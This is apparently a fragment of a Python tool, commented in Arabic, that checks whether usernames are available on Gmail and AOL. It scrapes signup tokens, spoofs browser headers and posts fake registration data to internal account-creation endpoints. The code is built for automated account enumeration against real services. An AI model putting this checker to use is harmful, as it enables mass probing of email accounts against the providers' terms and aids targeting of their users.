# ==================== فحص جوجل (Gmail) ====================
def get_google_tokens():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))
        
        headers = {"google-accounts-xsrf": "1", "user-agent": gg()}
        res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&hl=en-GB', headers=headers, timeout=10)
        tok_search = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
        
        if not tok_search:
            return None, None
        tok = tok_search.group(2)
        
        validate_data = {
            'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=validate_data,
            timeout=10
        )
        
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        new_host = response.cookies.get_dict().get('__Host-GAPS', host)
        return tl, new_host
    except Exception:
        return None, None

def google_check(username):
    tl, host = get_google_tokens()
    if not tl:
        return None
    
    try:
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': gg(),
        }
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        response = requests.post(
            f'https://accounts.google.com/_/signup/usernameavailability?TL={tl}',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=data,
            timeout=10
        )
        
        if '"gf.uar",1' in response.text:
            return True  # متاح
        else:
            return False  # غير متاح
    except:
        return None

# ==================== فحص AOL (نسخة محسنة) ====================
def aol_check(email):
    """
    التحقق من توفر بريد AOL.
    تعيد True إذا كان البريد متاحاً (غير مسجل)، False إذا كان مسجلاً، None إذا حدث خطأ.
    """
    session = requests.Session()
    
    # الخطوة 1: محاكاة متصفح حقيقي بكل التفاصيل
    headers_init = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
    }
    
    try:
        # جلب الصفحة الرئيسية مع البارامترات الكاملة
        params = {
            'intl': 'us',
            'src': 'fp-us',
            'activity': 'default',
            'pspid': '1197803361',
            'specId': 'yidregsimplified'
        }
        response = session.get('https://login.aol.com/account/create', params=params, headers=headers_init, timeout=15)
        
        if response.status_code != 200:
            return None
        
        # استخراج البيانات المخفية باستخدام BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        crumb = soup.find('input', {'name': 'crumb'})
        acrumb = soup.find('input', {'name': 'acrumb'})
        session_index = soup.find('input', {'name': 'sessionIndex'})
        
        if not crumb or not acrumb or not session_index:
            return None
        
        crumb_val = crumb.get('value')
        acrumb_val = acrumb.get('value')
        session_index_val = session_index.get('value')
        
        # تجهيز بيانات POST
        local_part = email.split('@')[0]
        domain = email.split('@')[1] if '@' in email else 'aol.com'
        
        # بنفس ترتيب النموذج الأصلي
        payload = {
            'sessionIndex': session_index_val,
            'acrumb': acrumb_val,
            'crumb': crumb_val,
            'specId': 'yidregsimplified',
            'context': 'REGISTRATION',
            'done': '',
            'googleIdToken': '',
            'authCode': '',
            'attrSetIndex': '0',
            'tos0': 'oath_freereg|us|en-US',
            'firstName': 'Test',
            'lastName': 'User',
            'yidDomain': domain,
            'userId': local_part,
            'password': 'Temp@123456',  # كلمة مرور مؤقتة عشوائية
            'mm': '01',
            'dd': '15',
            'yyyy': '1990'
        }
        
        # رؤوس طلب التحقق (محاكاة Ajax)
        headers_post = {
            'User-Agent': headers_init['User-Agent'],
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://login.aol.com',
            'Referer': response.url,  # الرابط الكامل بعد التوجيه
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        # تنفيذ طلب التحقق
        validate_response = session.post(
            'https://login.aol.com/account/create/validate',
            params=params,  # نفس البارامترات
            data=payload,
            headers=headers_post,
            timeout=15
        )
        
        # تحليل الاستجابة
        if validate_response.status_code != 200:
            return None
        
        result = validate_response.json()
        
        # المفتاح 'displayName' يظهر فقط عندما يكون الاسم متاحاً
        if 'displayName' in result and result['displayName']:
            return True  # متاح
        else:
            # قد يكون هناك حقل errors يدل على أن الاسم مأخوذ
            if 'errors' in result and any('already taken' in str(err).lower() for err in result['errors']):
                return False
            else:
                # إذا لم نستطع التحديد، نفترض أنه غير متاح لتجنب النتائج الإيجابية الخاطئة
                return False
                
    except Exception as e:
        # يمكن إضافة طباعة للخطأ للتصحيح
        # print(f"Error in aol_check: {e}")
        return None

